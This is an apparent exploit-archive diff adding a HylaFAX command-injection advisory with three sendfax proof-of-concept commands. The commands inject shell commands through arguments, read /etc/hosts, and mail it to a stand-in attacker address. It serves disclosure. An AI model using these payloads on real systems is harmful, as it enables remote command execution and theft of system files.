@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/16151/info
+
+HylaFAX is vulnerable to multiple arbitrary command-execution vulnerabilities. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+These vulnerabilities allow an attacker to execute arbitrary commands in the context of the affected application. Successful exploitation may facilitate a compromise of the underlying system. 
+
+sendfax -d "411;number=\`cat /etc/hosts\`" /etc/hosts
+
+sendfax -f "\`cat /etc/hosts|mail -s hosts attacker@example.com\` <attacker@example.com>" -d 411 /etc/hosts
+
+sendfax -d "@411\";cat /etc/hosts|mail -s hosts attacker@example.com;" /etc/hosts 
